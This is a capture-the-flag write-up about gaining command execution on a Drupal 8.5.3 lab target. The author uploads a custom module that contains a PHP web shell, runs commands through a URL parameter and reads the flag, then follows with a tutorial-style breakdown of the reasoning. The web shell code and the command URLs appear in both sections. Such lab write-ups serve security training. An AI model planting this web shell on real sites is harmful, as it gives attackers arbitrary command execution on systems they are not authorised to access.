# Drupal Module Upload Challenge Write-up

## Challenge Information

Target:

* Drupal 8.5.3
* Credentials provided:

  * admin / password

Goal:

* Compromise the target machine
* Retrieve the flag

---

## Initial Analysis

Since valid admin credentials were provided, the challenge likely focused on abusing administrative functionality instead of authentication bypass.

Possible attack surfaces:

* Module upload
* Theme upload
* Plugin installation
* File management

Drupal modules contain PHP code, so module upload was chosen as the initial exploitation path.

---

## Malicious Module Creation

A custom Drupal module was created locally.

### flagreader.info.yml

```yaml
name: Flag Reader
type: module
description: Test module
core: 8.x
package: Custom
version: 1.0
```

### shell.php

```php
<?php

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The module was compressed into a ZIP archive and uploaded through:

```text
/admin/modules/install
```

---

## Exploitation

After enabling the module, direct access to:

```text
/modules/flagreader/flagreader.module
```

returned:

```text
Forbidden
```

This indicated Apache restrictions on `.module` files.

The payload was modified to use `shell.php` instead.

Successful command execution was confirmed using:

```text
/modules/custom/flagreader/shell.php?cmd=id
```

Output:

```text
uid=33(www-data)
```

This confirmed remote command execution as the `www-data` user.

---

## Post-Exploitation Enumeration

The current directory contents were enumerated using:

```text
ls -la
```

A flag file was identified:

```text
flag_MzllO.txt
```

---

## Flag Retrieval

The flag was retrieved using:

```text
cat flag_MzllO.txt
```

Flag:

```text
pg{dGH6zPKTfx}
```

---

## Lessons Learned

* Administrative access to CMS platforms can often lead directly to RCE through plugin/module functionality.
* Apache restrictions may block direct access to certain file types.
* Enumeration and adapting to failures are critical during exploitation.
* Understanding framework behavior is more important than memorizing specific exploits.

## 1. How I reasoned through this challenge

Let’s break down the thinking process.

## My Steps

## Step 0 — Read the challenge carefully

You were given:

* Drupal 8.5.3
* admin credentials
* Goal: compromise machine and get flag

That immediately tells me:

> “This is probably not about authentication bypass.”
> It is probably about “what can an admin do?”

That narrows the attack surface massively.

### Step 1 — Think in capabilities

If I am admin in a CMS, what dangerous things can I usually do?

Typical CMS admin powers:

* upload plugins/modules
* upload themes
* edit templates
* edit PHP
* install extensions
* manage files
* run scheduled tasks

Now ask:

> Which of these can become code execution?

The strongest candidate: `Plugin / module upload`

Because plugins/modules often contain executable server-side code.

### Step 2 — Know the technology

You knew: `Drupal 8`

Experienced players immediately associate Drupal with:

* modules
* themes
* PHP execution
* historical RCE vulns (Drupalgeddon)

Even if you don’t know exact exploits, you know:

> Drupal modules are PHP code.

So if upload is allowed: `upload PHP → server executes PHP`

That’s the key inference.

### Step 3 — Minimal viable payload

Do NOT overcomplicate early.

You only need proof of execution.

Smallest useful payload:

```php
<?php system($_GET['cmd']); ?>
```

Why?

Because it lets you run arbitrary Linux commands remotely.

### Step 4 — Adapt when blocked

Your first attempt failed: `/modules/flagreader/flagreader.module → Forbidden`

Important lesson:

> Failure gives information.

What did “Forbidden” imply?

Not:

* module failed
* upload failed

But:

* Apache blocks direct .module access

That means:

> execution method wrong, not exploit wrong

So we pivoted.

### Step 5 — Change one variable only

Instead of rewriting everything:

We changed: `flagreader.module → shell.php`

Why?

Apache commonly blocks:

* .module
* config
* internal framework files

But often allows:

* .php

This is pattern recognition from PHP environments.

### Step 6 — Verify execution

You got: `uid=33(www-data)`

That confirms:

* PHP executed
* system() worked
* command execution achieved

This is a checkpoint.

Good hackers constantly verify assumptions.

### Step 7 — Enumerate

After RCE:

Don’t immediately panic about reverse shell.

First:

* pwd
* whoami
* ls
* find

You did: `ls -la`

and discovered: `flag_MzllO.txt`

Challenge solved.

`http://<TARGET-IP>/modules/custom/flagreader/shell.php?cmd=cat+flag_MzllO.txt`

### The real skill underneath

The real skill is NOT: `memorize Drupal exploit`

It is:

```txt
understand attack surface
→ gain capability
→ verify
→ adapt
→ enumerate
```

That scales to:

* web
* cloud
* AD
* mobile
* binary exploitation
* real pentesting
